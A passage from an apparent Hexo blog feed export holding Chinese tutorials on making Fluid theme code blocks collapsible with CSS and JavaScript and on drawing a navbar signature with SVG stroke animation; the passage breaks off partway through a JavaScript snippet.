class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 为展开的内容区域添加底部连接效果 */</span></span><br><span class="line"><span class="selector-class">.collapse</span><span class="selector-class">.show</span> {</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> <span class="number">5px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#303030</span>;</span><br><span class="line">}</span><br><span class="line"><span class="selector-class">.category-collapse</span><span class="selector-class">.collapse</span><span class="selector-class">.show</span> {</span><br><span class="line">  <span class="comment">/* 将背景色设置为透明，使内容区域背景透明 */</span></span><br><span class="line">  <span class="attribute">background-color</span>: transparent;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>有兴趣可以自行修改 css 样式使其符合你的审美。</p><div class="note warning flat"><p>warning</p><p>请注意在<code>_config.fluid.yml</code> 中进行引入</p></div><h3 id="一个可选的配置"><a class="markdownIt-Anchor" href="#一个可选的配置"></a> 一个可选的配置</h3><p>因为我默认开启了代码块的语言类型显示，所以在代码的右上角会自动显示代码语言，如果点击按钮将代码展开，则会在 header 上出现两个代码语言文字，一左一右不是很美观。</p><p>于是我创建了 <code>source\js\watch.js</code></p><div class="note info flat"><p><s>前情提要</s></p><p><code>watch.js</code> 是以前写的，你也可以找一个已经写过的 js 文件，在底部写，或是单独创建一个 js 文件用于编写。</p></div><p>为了解决上面的重复问题，编写 js 代码如下：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 给代码收起按钮添加监听事件</span></span><br><span class="line"><span class="keyword">const</span> collapseBtns = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">'.collapse-header button'</span>);</span><br><span class="line">collapseBtns.<span class="title function_">forEach</span>(<span class="function"><span class="params">button</span> =&gt;</span> {</span><br><span class="line">  button.<span class="title function_">addEventListener</span>(<span class="string">'click'</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">    <span class="comment">// 获取当前按钮的类名</span></span><br><span class="line">    <span class="keyword">const</span> btnClassName = button.<span class="property">className</span>; <span class="comment">// 使用 button 变量，而不是 collapseBtns</span></span><br><span class="line">    <span class="keyword">const</span> codeTypeSpan = button.<span class="property">nextElementSibling</span>; <span class="comment">// 获取当前按钮后面的 span 标签</span></span><br><span class="line">    <span class="comment">// console.log('当前获取到的按钮类名为：', btnClassName);</span></span><br><span class="line">    <span class="comment">// console.log('当前获取到的 span 标签为：', codeTypeSpan);</span></span><br><span class="line">    <span class="comment">// console.log('当前检测展开状态：', btnClassName.includes('collapsed'));</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (btnClassName.<span class="title function_">includes</span>(<span class="string">'collapsed'</span>)) { <span class="comment">// 判断按钮是否在展开状态</span></span><br><span class="line">      <span class="comment">// 展开之后将 span 标签设为隐藏</span></span><br><span class="line">      codeTypeSpan.<span class="property">style</span>.<span class="property">display</span> = <span class="string">'none'</span>;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      <span class="comment">// 收起之后将 span 标签设为显示</span></span><br><span class="line">      codeTypeSpan.<span class="property">style</span>.<span class="property">display</span> = <span class="string">'inline-block'</span>;</span><br><span class="line">    }</span><br><span class="line">  });</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p>这样一来，点击按钮展开之后，header 的代码语言提示问题将会被设为隐藏（并非卸载）。</p><h3 id="一个可选配置的优化"><a class="markdownIt-Anchor" href="#一个可选配置的优化"></a> 一个可选配置的优化</h3><p>为什么说是优化呢？因为实际使用下来，我发现每次都要手动使用鼠标点击那么小的一个按钮实在过于折磨，不如直接点击 header 实现折叠或展开。修改就不多说了，如果你能看懂上面的配置，那么下面的配置也能，因为我只做了小小的修改。</p><p><code>codeFloding.js</code>：将 <code>data-toggle</code> 和 <code>data-target</code> 换到 header 上，并在 watch.js 中手动切换 button 的 class 类名</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取唯一 ID</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getUuid</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>(<span class="number">36</span>).<span class="title function_">substring</span>(<span class="number">2</span>, <span class="number">8</span>) + <span class="title class_">Date</span>.<span class="title function_">now</span>().<span class="title function_">toString</span>(<span class="number">36</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册 Hexo 的过滤器，在文章渲染后处理代码块</span></span><br><span class="line">hexo.<span class="property">extend</span>.<span class="property">filter</span>.<span class="title function_">register</span>(</span><br><span class="line">  <span class="string">"after_post_render"</span>,</span><br><span class="line">  <span class="function">(<span class="params">data</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">const</span> { line_number, lib } = hexo.<span class="property">theme</span>.<span class="property">config</span>.<span class="property">code</span>.<span class="property">highlight</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> reg;</span><br><span class="line">    <span class="keyword">if</span> (lib === <span class="string">"highlightjs"</span>) {</span><br><span class="line">      reg = line_number </span><br><span class="line">        ? <span class="regexp">/(&lt;figure class="highlight.+?&gt;)(.+?hljs (.*?)".+?)(&lt;\/figure&gt;)/gim</span>s </span><br><span class="line">        : <span class="regexp">/(&lt;div class="code-wrapper.+?&gt;)(.+?hljs (.*?)".+?)(&lt;\/div&gt;)/gim</span>s;</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span> (lib === <span class="string">"prismjs"</span>) {</span><br><span class="line">      reg = <span class="regexp">/(&lt;div class="code-wrapper.+?&gt;)(.+?data-language="(.*?)".+?)(&lt;\/div&gt;)/gim</span>s;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    data.<span class="property">content</span> = data.<span class="property">content</span>.<span class="title function_">replace</span>(reg, <span class="function">(<span class="params">match, begin, inner, lang, end</span>) =&gt;</span> {</span><br><span class="line">      <span class="keyword">const</span> collapseId = <span class="string">`collapse-<span class="subst">${getUuid()}</span>`</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> collapseContainer = <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div class="collapse-header" data-toggle="collapse" data-target="#<span class="subst">${collapseId}</span>"&gt;</span></span><br><span class="line"><span class="string">          &lt;button class="collapse-btn collapsed" type="button"&gt;</span></span><br><span class="line"><span class="string">            &lt;svg t="1730562455310" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="9905"&gt;</span></span><br><span class="line"><span class="string">              &lt;path d="M857.766234 511.488511L345.623017 0 297.174825 49.348412 759.846873 511.488511 297.174825 974.651588 345.623017 1022.977023z" fill="#ffffff" p-id="9906"&gt;&lt;/path&gt;</span></span><br><span class="line"><span class="string">            &lt;/svg&gt;</span></span><br><span class="line"><span class="string">          &lt;/button&gt;</span></span><br><span class="line"><span class="string">          &lt;span&gt;<span class="subst">${lang}</span>&lt;/span&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">      `</span>;</span><br><span class="line">      <span class="keyword">const</span> collapseDiv = <span class="string">`&lt;div class="collapse" id="<span class="subst">${collapseId}</span>"&gt;<span class="subst">${inner}</span>&lt;/div&gt;`</span>;</span><br><span class="line">      <span class="keyword">return</span> begin + collapseContainer + collapseDiv + end;</span><br><span class="line">    });</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">  },</span><br><span class="line">  <span class="number">10000</span></span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><code>codeFloding.css</code>：增加了鼠标悬停在 header 时，将鼠标样式改为 pointer 提示用户</p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.collapse-header</span> {</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">5px</span> <span class="number">5px</span> <span class="number">0</span> <span class="number">0</span>; <span class="comment">/* 设置圆角，使背景更柔和 */</span></span><br><span class="line">  <span class="attribute">position</span>: relative; <span class="comment">/* 使按钮可以定位 */</span></span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#303030</span>; <span class="comment">/* 设置背景颜色为深灰色 */</span></span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">5px</span> <span class="number">5px</span>; <span class="comment">/* 添加上下左右各5px的内边距 */</span></span><br><span class="line">  <span class="attribute">cursor</span>: pointer; <span class="comment">/* 鼠标悬停时显示为手指光标 */</span></span><br><span class="line">}</span><br><span class="line">...略...</span><br></pre></td></tr></tbody></table></figure><p><code>watch.js</code></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 给代码收起按钮和整个 header 添加监听事件</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> collapseHeaders = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">'.collapse-header'</span>);</span><br><span class="line">collapseHeaders.<span class="title function_">forEach</span>(<span class="function"><span class="params">header</span> =&gt;</span> {</span><br><span class="line">  <span class="keyword">const</span> button = header.<span class="title function_">querySelector</span>(<span class="string">'button'</span>);</span><br><span class="line">  <span class="keyword">const</span> codeTypeSpan = header.<span class="title function_">querySelector</span>(<span class="string">'span'</span>);</span><br><span class="line"></span><br><span class="line">  header.<span class="title function_">addEventListener</span>(<span class="string">'click'</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'header clicked'</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 手动切换按钮的类名</span></span><br><span class="line">    button.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">'collapsed'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据按钮状态显示或隐藏 span</span></span><br><span class="line">    <span class="keyword">if</span> (button.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">'collapsed'</span>)) {</span><br><span class="line">      <span class="comment">// console.log('收起代码块');</span></span><br><span class="line">      codeTypeSpan.<span class="property">style</span>.<span class="property">display</span> = <span class="string">'inline-block'</span>;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      <span class="comment">// console.log('展开代码块');</span></span><br><span class="line">      codeTypeSpan.<span class="property">style</span>.<span class="property">display</span> = <span class="string">'none'</span>;</span><br><span class="line">    }</span><br><span class="line">  });</span><br><span class="line"></span><br><span class="line">  button.<span class="title function_">addEventListener</span>(<span class="string">'click'</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> {</span><br><span class="line">    <span class="comment">// 阻止事件冒泡，避免触发 header 的点击事件</span></span><br><span class="line">    event.<span class="title function_">stopPropagation</span>();</span><br><span class="line">  });</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><div class="note info flat"><p>以上内容若有侵权，可联系删除</p></div><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 美化 </tag>
            
            <tag> Hexo </tag>
            
            <tag> Fluid </tag>
            
            <tag> Bootstrap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 CSS 和 JS 实现博客导航栏线条动画效果</title>
      <link href="/posts/38001.html"/>
      <url>/posts/38001.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2><p>SVG 描边动画（stroke animation）是一种通过控制 SVG 元素的描边（<code>stroke</code>）属性，让路径逐步显示出来，产生 “手写” 或 “线条绘制” 的视觉效果。它的核心是使用：</p><ul><li><code>stroke-dasharray</code>：设置虚线的模式，等同于 “路径总长”，将整个路径打散成可动画的虚线段。</li><li><code>stroke-dashoffset</code>：设置虚线的偏移距离，将整条线 “推出可见范围”，通过动画逐渐归零，就像笔迹被画出来一样。</li><li><code>@keyframes</code>：通过 CSS 的 <code>@keyframes</code> 或 JS 动态设置这两个属性，实现逐步描边。</li></ul><p>这样就能模拟路径从无到有的 “被画出” 的过程。所以首先我们得准备好一个能用的 SVG 图（<a href="https://www.runoob.com/svg/svg-intro.html">什么是 SVG？</a>）。</p><h3 id="方法一"><a class="markdownIt-Anchor" href="#方法一"></a> 方法一</h3><p>你可以使用 Adobe 的 adobe illustrator 来徒手绘制 svg 图。</p><p>怎么操作呢，就是创建好画布之后直接使用铅笔 / 钢笔 / 画笔等工具进行一个手画。</p><p>例如使用铅笔工具：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411020452346.png" alt="image-20241102045227167"></p><p>左边能看到路径锚点，右边能看到各个图层。</p><p>紧接着将其导出为 svg：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411020454590.png" alt="image-20241102045454543"></p><table><thead><tr><th>选项</th><th>推荐设置</th></tr></thead><tbody><tr><td>样式</td><td><strong>内部 CSS</strong></td></tr><tr><td> 字体</td><td><strong>转换为轮廓</strong></td></tr><tr><td>图像</td><td><strong>保留</strong>（无图也行）</td></tr><tr><td>对象 ID</td><td><strong> 保留</strong>（方便调试）</td></tr><tr><td>小数位数</td><td><strong> 3</strong></td></tr></tbody></table><p>点击显示代码，它将调用文本编辑器让你提前查看。</p><p>svgd 代码大致是：</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">viewBox</span>=<span class="string">"0 0 232.798 65.792"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">defs</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="selector-class">.a</span>{<span class="attribute">fill</span>:none;<span class="attribute">stroke</span>:<span class="number">#000</span>;<span class="attribute">stroke-miterlimit</span>:<span class="number">10</span>;}</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">defs</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>未标题-1<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">class</span>=<span class="string">"a"</span> <span class="attr">d</span>=<span class="string">"M166.57,148.587c-7.072.465-13.436,4.25-19.491,7.933-3.19,1.941-6.427,3.92-8.947,6.676-2.646,2.9-4.364,6.5-6.044,10.041-2.088,4.406-4.207,9.467-2.374,13.985a16.6,16.6,0,0,0,3.792,5.134,131.478,131.478,0,0,0,11.071,10.113,10.374,10.374,0,0,0,4.293,2.435,10.787,10.787,0,0,0,4.654-.435l18.454-4.506a.6.6,0,0,0-.954-.537"</span> <span class="attr">transform</span>=<span class="string">"translate(-128.515 -144.528)"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">path</span> <span class="attr">class</span>=<span class="string">"a"</span> <span class="attr">d</span>=<span class="string">"M185.9,171.121a4.907,4.907,0,0,1,3.356,3.268"</span> <span class="attr">transform</span>=<span class="string">"translate(-128.515 -144.528)"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">path</span> <span class="attr">class</span>=<span class="string">"a"</span> <span class="attr">d</span>=<span class="string">"M184.46,189.411a72.961,72.961,0,0,1,2.635,20.9"</span> <span class="attr">transform</span>=<span class="string">"translate(-128.515 -144.528)"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">path</span> <span class="attr">class</span>=<span class="string">"a"</span> <span class="attr">d</span>=<span class="string">"M224.639,195.225a13.226,13.226,0,0,0-2.332-4.606,4.5,4.5,0,0,0-4.659-1.511,6.49,6.49,0,0,0-1.927,1.276q-3.384,2.889-6.612,5.953c-1.78,1.689-3.616,4.431-2.06,6.329a5.055,5.055,0,0,0,3.076,1.384,15.353,15.353,0,0,0,5.2.412,5.2,5.2,0,0,0,4.119-2.853c.621-1.5.234-3.2.241-4.829a9.808,9.808,0,0,1,1.229-4.7c.318,2.958.662,6,2.08,8.618s4.193,4.726,7.154,4.442"</span> <span class="attr">transform</span>=<span class="string">"translate(-128.515 -144.528)"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">path</span> <span class="attr">class</span>=<span class="string">"a"</span> <span class="attr">d</span>=<span class="string">"M264.978,149.682q-5.542,20.928-9.175,42.3a5.173,5.173,0,0,0,.306,3.722,4.7,4.7,0,0,0,2.181,1.548,25.766,25.766,0,0,0,8.293,2.02"</span> <span class="attr">transform</span>=<span class="string">"translate(-128.515 -144.528)"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">path</span> <span class="attr">class</span>=<span class="string">"a"</span> <span class="attr">d</span>=<span class="string">"M301.091,144.6c-1.35,8.821-2.7,17.644-3.829,26.5-.958,7.52-1.743,15.268.208,22.594.763,2.864,2.659,6.114,5.619,5.968"</span> <span class="attr">transform</span>=<span class="string">"translate(-128.515 -144.528)"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">path</span> <span class="attr">class</span>=<span class="string">"a"</span> <span class="attr">d</span>=<span class="string">"M355.807,194.125c2.7-2.028,4.855-5.064,5-8.441.477-11.264-19.128-16.029-23.575-5.714-1.68,3.9-.743,11.83,1.3,15.42C342.345,202.118,350.785,197.892,355.807,194.125Z"</span> <span class="attr">transform</span>=<span class="string">"translate(-128.515 -144.528)"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>在导出的 svg 代码中，我们最关心的是：</p><ul><li>有 <code>stroke</code> 且 <code>fill="none"</code>：动画只作用于描边部分，必须明确设置无填充</li><li>有使用到 <code>&lt;path&gt;</code> 元素：做描边动画的图形元素，支持路径长度计算</li><li>有 <code>viewBox</code>：在不同尺寸下能比例正确</li></ul><h3 id="方法二"><a class="markdownIt-Anchor" href="#方法二"></a> 方法二</h3><p>你也可以使用 adobe illustrator 的文字工具指定字体，来生成好看的字体效果，例如：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411020501894.png" alt="image-20241102050103841"></p><p>这个时候你只需要用选择工具，框选文字转换轮廓就可以得到复杂路径图层：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411020502168.png" alt="image-20241102050239120"></p><p>创建之后，按住 ctrl 键，你会发现文字上就出现了许多路径锚点：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411020503277.png" alt="image-20241102050353227"></p><p>图层中也自动有了每个字母的复合路径：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411020504918.png" alt="image-20241102050435882"></p><p>可以和方法一一样直接导出了。</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">viewBox</span>=<span class="string">"0 0 203 74.13"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>未标题-1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">"M259.914,163.879c1.1-.439,16.567-6.8,17-16.9,0-.109,1.537-6.144-12.835-6.693-26.661-.987-52,20.956-52.662,41.362,0,1.536-2.634,24.027,22.82,24.905S281.2,189.881,281.2,189.881s.987-.878,1.536.219c0,.11.22,2.085-3.511,5.266-1.206,1.1-21.722,15.909-43.556,15.031-16.456-.658-29.4-9-28.635-28.855.769-22.491,28.526-46.3,56.832-45.2,1.1,0,17.225.22,17.334,10.422.11,10.094-15.8,18.981-17.225,19.749-1.426.878-5.375,2.413-6.472.109C256.513,164.647,257.72,164.647,259.914,163.879Z"</span> <span class="attr">transform</span>=<span class="string">"translate(-207 -136.305)"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">"M294.358,202.717c-8.557.11-9.435-10.094-9.216-12.069.22-2.413,1.1-7.35,1.1-7.35.768-1.975,4.168-1.756,4.168.219,0,.549-4.168,16.018,4.389,15.579,5.815-.22,11.3-10.093,13.824-14.7.987-1.865,2.523.658.329,5.046C308.182,190.978,302.147,202.717,294.358,202.717Zm-3.291-27.537a2.882,2.882,0,0,1-3.292,2.413,2.787,2.787,0,0,1-2.413-3.182c0-.987,1.1-3.73,3.4-3.4C291.177,171.339,291.286,173.643,291.067,175.18Z"</span> <span class="attr">transform</span>=<span class="string">"translate(-207 -136.305)"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">"M327.82,202.278c-6.584.109-7.571-6.582-7.571-6.582s-3.95,7.24-7.79,7.131c-2.084,0-7.35-1.865-6.033-12.179s8.228-14.921,11.739-14.81c6.363.218,5.815,5.7,5.7,6.253-.877,2.853-1.974,2.084-2.742,1.755,0,0,.658-4.608-3.072-4.717-3.181-.11-6.363,4.717-7.46,9.654-1.207,5.047-.439,10.2,2.193,10.2,4.06,0,7.461-10.972,7.9-13.714.218-1.1,4.278-.22,4.058,1.535-.109,0-4.058,11.739,3.292,11.739,3.292,0,7.57-3.4,13.383-14.043.989-1.755,2.526.769.221,5.048C339.779,193.063,334.292,202.169,327.82,202.278Z"</span> <span class="attr">transform</span>=<span class="string">"translate(-207 -136.305)"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">"M361.938,184.615c1.1-1.756,2.523.767.218,5.046-.768,1.536-6.582,13.6-17.223,13.056-12.947-.659-13.275-15.031-13.166-27.1.108-10.642,6.472-32.365,14.92-31.817,5.376.329,7.352,6.912,5.7,17.664-2.084,14.591-10.642,28.964-14.153,33.024,1.976,3.071,4.718,4.936,7.9,4.936C354.148,199.425,359.414,189.223,361.938,184.615Zm-15.36-36.754c-4.17-.329-10.093,13.165-11.519,27.977-.331,4.5.327,12.068,1.754,16.017,5.7-8.228,7.462-12.507,11.411-28.086C348.992,160.917,350.747,148.08,346.578,147.861Z"</span> <span class="attr">transform</span>=<span class="string">"translate(-207 -136.305)"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">"M382.561,184.615c1.1-1.756,2.524.767.219,5.046-.768,1.536-6.582,13.6-17.223,13.056-12.948-.659-13.275-15.031-13.166-27.1.108-10.642,6.472-32.365,14.92-31.817,5.376.329,7.352,6.912,5.705,17.664-2.084,14.591-10.643,28.964-14.153,33.024,1.976,3.071,4.718,4.936,7.9,4.936C374.771,199.425,380.038,189.223,382.561,184.615ZM367.2,147.861c-4.171-.329-10.093,13.165-11.519,27.977-.331,4.5.327,12.068,1.753,16.017,5.706-8.228,7.463-12.507,11.411-28.086C369.616,160.917,371.371,148.08,367.2,147.861Z"</span> <span class="attr">transform</span>=<span class="string">"translate(-207 -136.305)"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">"M408.451,184.615c.769-1.427,2.085,0,1.316,2.742-1.206,3.621-5.7,8.557-13.933,6.693-1.536,4.937-4.826,9.435-10.311,9.106-5.268-.329-6.7-6.473-6.364-10.423s2.522-12.4,6.143-12.946a5.006,5.006,0,0,1,4.937-4.169c2.853-.22,7.459,3.291,6.693,12.836a12.294,12.294,0,0,1-.219,1.975c3.619,1.426,8.117.988,10.641-3.95Zm-21.943,15.359c2.744.219,5.158-3.62,6.145-7.022a14.8,14.8,0,0,1-6.583-7.789c-1.207.878-3.073,5.7-3.181,7.9C382.778,195.476,382.889,199.755,386.508,199.974Zm4.06-20.626c-1.865.11-2.084,2.743-1.426,4.609a9.361,9.361,0,0,0,4.169,4.936C393.421,184.944,393.2,179.129,390.568,179.348Z"</span> <span class="attr">transform</span>=<span class="string">"translate(-207 -136.305)"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>仔细观察会发现这种方式得到的 svg 代码是不符合我们的要求（见方法一）的。还需要全选到所有的路径，在属性中将填充设为 none 才行。</p><h3 id="方法三"><a class="markdownIt-Anchor" href="#方法三"></a> 方法三</h3><p>借助在线网站：<a href="https://danmarshall.github.io/google-font-to-svg-path/">Google Font to Svg Path</a> 完成 Svg 的生成。</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411020507918.png" alt="image-20241102050728816"></p><p>该网站提供<a href="https://fonts.google.com/">谷歌字体</a>供选择，也支持自己上传字体，使用起来是很方便的。</p><p>其中：</p><ul><li>variant：表示你选择的字体的风格 —— 正常还是斜体</li><li> text：输入你要生成 svg 的语句或单词</li><li> union：这个影响 svg 路径，是否要将字母看作整体</li><li> kerning：字距</li><li> separate characters：字符是否分离</li><li> bezier accuracy：跟字体像素有关</li><li> Dxf Units：尺寸单位</li><li> Fill：填充颜色</li><li> Stroke：线条颜色</li><li> Stroke Width：线条宽度</li><li> Non-scaling stroke：是否可缩放</li><li> Fill rule：填充的规则</li></ul><p>参数的变动会实时的更新在下方的 svg 元数据框中。</p><p>这种方法生成的 svg 也是不符合我们的要求（见 fang'fa）的，还需要到能处理 svg 的软件中将它的填充设为 <code>none</code></p><h2 id="编写js"><a class="markdownIt-Anchor" href="#编写js"></a> 编写 js</h2><p>有了上述方法，可以得到 svg 图。这里简单说说我的方案：</p><ul><li>字体：Signerica_Medium</li><li>Google Font to Svg Path：仅 Union 勾选，Size 为 100。其余默认</li><li>待生成文字为：CiaoHello</li></ul><p>当然，还需要到 Adobe Illustrator 中将填充设置成无。</p><p>有了 svg 之后，在 hexo 博客的 <code>source\js</code> 目录下创建 <code>sign.js</code></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> navbarBrand = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">'.container a'</span>);</span><br><span class="line"><span class="comment">// 替换navbarBrand中的strong标签为svg标签</span></span><br><span class="line">navbarBrand.<span class="property">innerHTML</span> = <span class="string">`</span></span><br><span class="line"><span class="string">&lt;svg class="svg" viewBox="0 0 682.2 98.507" 